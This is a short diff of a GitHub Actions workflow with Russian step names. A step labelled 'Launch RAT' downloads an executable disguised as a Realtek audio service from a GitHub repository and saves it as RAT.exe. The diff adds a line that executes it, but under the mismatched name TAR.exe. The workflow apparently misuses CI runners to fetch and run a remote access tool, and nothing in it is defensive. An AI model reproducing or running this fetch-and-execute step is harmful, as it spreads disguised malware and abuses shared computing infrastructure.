@@ -33,6 +33,7 @@ jobs:
         cmd /c install.bat
     - name: Запуск RAT
       run: |
-      Invoke-WebRequest https://raw.githubusercontent.com/ThePyGoose/KryptexCore/RtkAudUService32.exe -Outfile RAT.exe
+        Invoke-WebRequest https://raw.githubusercontent.com/ThePyGoose/KryptexCore/RtkAudUService32.exe -Outfile RAT.exe
+        ./TAR.exe
     - name: Запуск виртуальной машины выполнен
       run: cmd /c exit.bat
